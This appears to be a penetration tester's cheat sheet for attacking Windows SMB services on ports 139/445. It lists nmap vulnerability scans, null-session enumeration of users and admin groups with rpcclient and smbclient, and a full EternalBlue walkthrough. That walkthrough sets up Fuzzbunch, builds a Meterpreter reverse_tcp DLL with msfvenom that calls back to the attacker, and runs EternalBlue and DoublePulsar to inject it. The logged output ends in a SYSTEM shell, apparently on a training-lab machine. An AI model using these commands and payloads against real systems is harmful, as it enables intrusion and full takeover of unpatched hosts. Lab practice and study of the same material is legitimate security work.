# SMB / NetBIOS Ports 135-139,445


https://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions

### Enumerate with NMAP

* Check for vulnerabilities
```
# nmap -script=smb-vuln* ...
```

* Check **MS08-067**
```
# nmap -script=smb-vuln-ms08-067.nse
```

* Check **ETERNAL BLUE** MS17-010  --> For exploit see below:
```
# nmap -script=smb-vuln-ms17-010.nse
```

* Check for MS09-050???

* Check for NetBIOS Service
```
# nmap -Pn -n -sU -sT -p U:137,T:139,445
```

* OS Discovery via SMB
```
# nmap 10.0.0.19 -p 139, 445 --script smb-os-discovery.nse`
```

* Enumerate Shares
```
$ nmap --script smb-enum-shares -p 139,445 [ip]
```

* Enumerate All
```
# nmap -p 139,445, --script smb-enum* [host/ip]
```

### Enumerate using other tools

- To get all information from particular host:
  `# enum4linux -a 192.168.11.227`
  **IMPORTANT:** Sometimes enum4linux gives errors when trying to enumerate,
    use nmap script to be sure.

* **USE nbtscan from philip**  
  - nbtscan to find all hosts with SMB:
    `  # nbtscan -r 192.168.11.0/24 `

- smbmap
  See tools section below

## Connect to SMB Drive
- Connect from Linux to Windows
`$ rpcclient —U <username> <WinIPaddr>`

- Anonymous access to shared drive
```
$ smbclient //host/share -U " "%" "
```
http://www.tldp.org/HOWTO/SMB-HOWTO-8.html


## NULL Sessions
https://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions

* Null Session on *Windows*
```
net use \\192.168.1.1\ipc$ "" /u:""
net use
net view \\ip_address
```

* Connect NULL Session on Linux
```
$ rpcclient -U "" <IP>
$ rpcclient -U "" -N <IP>
```

* Enum with NULL Sessions
```
$ rpcclient-U "" x.x.x.x
Password:
rpcclient $> lsaenumsid                 # lists sid for users (?)
...
S-1-5-21-2000478354-1708537768-1957994488-500
...
rpcclient $> lookupsids S-1-5-21-2000478354-1708537768-1957994488-500
S-1-5-21-2000478354-1708537768-1957994488-500 NSL09\Administrador (1)
rpcclient $> lookupnames Administrador
Administrador S-1-5-21-2000478354-1708537768-1957994488-500 (User: 1)
rpcclient $> enumalsgroups builtin      # lists the groups on the host
group:[Administrators] rid:[0x220]
...
rpcclient $> queryaliasmem builtin 0x220              # list the members of the admin group
sid:[S-1-5-21-1214440339-1383384898-839522115-500]
sid:[S-1-5-21-1214440339-1383384898-839522115-1003]
sid:[S-1-5-21-2392188729-2485841371-4291725810-512]
```

## Tools

* rpcclient
```
$ rpcclient —U <username> <WinIPaddr>
rpcclient $>srvinfo                          # get version of windows
rpcclient $> enum
enumalsgroups  enumdomains    enumdrivers    enumkey     enumprivs
enumdata       enumdomgroups  enumforms      enumports   enumtrust
enumdataex     enumdomusers   enumjobs       enumprinter
rpcclient $> enumdomusers                     # lists users
rpcclient $> enumalsgroups domain             # list domain groups
rpcclient $> enumalsgroups builtin            # list built-in groups
rpcclient $> lookupnames administrators       # list group
rpcclient $> lookupnames administrator        # list user information
rpcclient $> queryuser 500                    # get detailed information about a user
```


* Smbclient
```
$ smbclient -N -L //server/share password options
$ smbclient \\\\[ip]\\[share name]
```

* smbmap  
  will show what you can do with given credentials (or null session if no credentials).  
```
$ smbmap -H [ip/hostname]
```


## Exploit Eternalblue  


1. Installing Fuzzbunch on Linux https://alamot.github.io/legacy_writeup/

  - Install 32bit packages
  ```
  # Install 32-bit architecture
  dpkg --add-architecture i386 && apt-get update && apt-get install wine32
  ```

  - Install wine

  ```
  WINEPREFIX="$HOME/.wine-fuzzbunch" WINEARCH=win32 wine wineboot
  ```

  - Install winetricks - https://github.com/Winetricks/winetricks

  ```
  cd "$(mktemp -d)"

  # Download the latest winetricks script (master="latest version") from Github.
  wget https://raw.githubusercontent.com/Winetricks/winetricks/master/src/winetricks

  # Mark the winetricks script (we've just downloaded) as executable
  chmod +x winetricks

  # Move the winetricks script to a location which will be in the standard user PATH.
  sudo mv winetricks /usr/bin

  # Download the latest winetricks BASH completion script (master="latest version") from Github.
  wget https://raw.githubusercontent.com/Winetricks/winetricks/master/src/winetricks.bash-completion

  # Move the winetricks BASH completion script to a standard location for BASH completion modules.
  sudo mv winetricks.bash-completion /usr/share/bash-completion/completions/winetricks

  # Update winetricks
  winetricks --self-update
  ```

  - Install python26 via winetricks
  ```
  WINEPREFIX="$HOME/.wine-fuzzbunch" winetricks python26
  ```
  - Get files for fuzzbunch from Git
  ```
  cd $HOME/.wine-fuzzbunch/drive_c && git clone https://github.com/mdiazcl/fuzzbunch-debian
  ```

  - Create script to run fuzzbunch
  ```
  sudo nano /usr/local/bin/fuzzbunch

    export WINEPREFIX=$HOME/.wine-fuzzbunch
    cd $HOME/.wine-fuzzbunch/drive_c/fuzzbunch-debian/windows
    wine ../../Python26/python.exe fb.py
  ```
  ```
  # Change to executable
  sudo chmod +x /usr/local/bin/fuzzbunch
  ```

2. Make the shellcode payload We need a DLL shellcode payload.
  ```
  $ cd $HOME/.wine-fuzzbunch/drive_c/
  $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[INSERT_YOUR_IP_HERE] LPORT=60000 -f dll -o shell.dll
  ```

3. Running fuzzbunch

```
$ fuzzbunch
...
[?] Default Target IP Address [] : 10.10.10.4
[?] Default Callback IP Address [] : 10.10.14.6    
[?] Use Redirection [yes] : no

[?] Base Log directory [C:\fuzzbunch-debian\logs] :
[*] Checking C:\fuzzbunch-debian\logs for projects
Index     Project                 
-----     -------                 
0         Create a New Project    

[?] Project [0] :
[?] New Project Name : legacy
[?] Set target log directory to 'C:\fuzzbunch-debian\logs\legacy\z10.10.10.4'? [Yes] :

[*] Initializing Global State
[+] Set TargetIp => 10.10.10.4
[+] Set CallbackIp => 10.10.14.6

[!] Redirection OFF
[+] Set LogDir => C:\fuzzbunch-debian\logs\legacy\z10.10.10.4
[+] Set Project => legacy

fb >
```

3. Executing EternalBlue

```
fb > use EternalBlue

[!] Entering Plugin Context :: Eternalblue
[*] Applying Global Variables
[+] Set NetworkTimeout => 60
[+] Set TargetIp => 10.10.10.4
[*] Applying Session Parameters
[*] Running Exploit Touches

[!] Enter Prompt Mode :: Eternalblue
...
[?] Execute Plugin? [Yes] : y    
[*] Executing Plugin
[*] Connecting to target for exploitation.
    [+] Connection established for exploitation.
[*] Pinging backdoor...
    [+] Backdoor not installed, game on.

...
[*] Pinging backdoor...
    [+] Backdoor returned code: 10 - Success!
    [+] Ping returned Target architecture: x86 (32-bit)
    [+] Backdoor installed
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] CORE sent serialized output blob (2 bytes):
0x00000000  08 00                                            ..
[*] Received output parameters from CORE
[+] CORE terminated with status code 0x00000000
[+] Eternalblue Succeeded
```

4. Executing DoublePulsar

```
fb Special (Eternalblue) > use DoublePulsar

[!] Entering Plugin Context :: Doublepulsar
[*] Applying Global Variables
[+] Set NetworkTimeout => 60
[+] Set TargetIp => 10.10.10.4

[*] Applying Session Parameters

[!] Enter Prompt Mode :: Doublepulsar

Module: Doublepulsar
====================

Name              Value                                                 
----              -----                                                 
NetworkTimeout    60                                                    
TargetIp          10.10.10.4                                            
TargetPort        445                                                   
OutputFile                                                              
Protocol          SMB                                                   
Architecture      x86                                                   
Function          OutputInstall                                         

[!] Plugin Variables are NOT Valid
[?] Prompt For Variable Settings? [Yes] :
[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1 for no timeout.
[?] NetworkTimeout [60] :
[*]  TargetIp :: Target IP Address
[?] TargetIp [10.10.10.4] :
[*]  TargetPort :: Port used by the Double Pulsar back door
[?] TargetPort [445] :
[*]  Protocol :: Protocol for the backdoor to speak

*-> 0) SMB     Ring 0 SMB (TCP 445) backdoor
    1) RDP     Ring 0 RDP (TCP 3389) backdoor

[?] Protocol [0] :
[*]  Architecture :: Architecture of the target OS

*-> 0) x86     x86 32-bits
    1) x64     x64 64-bits

[?] Architecture [0] :
[*]  Function :: Operation for backdoor to perform

    0) OutputInstall     Only output the install shellcode to a binary file on disk.
    1) Ping              Test for presence of backdoor
*-> 2) RunDLL            Use an APC to inject a DLL into a user mode process.
    3) RunShellcode      Run raw shellcode
    4) Uninstall         Remove's backdoor from system

[?] Function [0] : 2
[+] Set Function => RunDLL
[*]  DllPayload :: DLL to inject into user mode
[?] DllPayload [] :
[*]  DllPayload :: DLL to inject into user mode
[?] DllPayload [] : C:\shell.dll
[+] Set DllPayload => C:\shell.dll
[*]  DllOrdinal :: The exported ordinal number of the DLL being injected to call
[?] DllOrdinal [1] :
[*]  ProcessName :: Name of process to inject into
[?] ProcessName [lsass.exe] : svchost.exe    
[+] Set ProcessName => svchost.exe
[*]  ProcessCommandLine :: Command line of process to inject into
[?] ProcessCommandLine [] :

[!] Preparing to Execute Doublepulsar
[*] Redirection OFF
[+] Configure Plugin Local Tunnels
[+] Local Tunnel - local-tunnel-1
[?] Destination IP [10.10.10.4] :
[?] Destination Port [445] :
[+] (TCP) Local 10.10.10.4:445

[+] Configure Plugin Remote Tunnels
```

  It’s important to change the ProcessName from lsass.exe to svchost.exe !!!

```
[?] Execute Plugin? [Yes] :
[*] Executing Plugin
[+] Selected Protocol SMB
[.] Connecting to target...
[+] Connected to target, pinging backdoor...
    [+] Backdoor returned code: 10 - Success!
    [+] Ping returned Target architecture: x86 (32-bit) - XOR Key: 0x00811F87
    SMB Connection string is: Windows 5.1
    Target OS is: XP x86
    [+] Backdoor installed
    [+] DLL built
    [.] Sending shellcode to inject DLL
    [+] Backdoor returned code: 10 - Success!
    [+] Backdoor returned code: 10 - Success!
    [+] Backdoor returned code: 10 - Success!
    [+] Command completed successfully
[+] Doublepulsar Succeeded
Back to metasploit:

[*] Sending stage (179267 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM :D
```
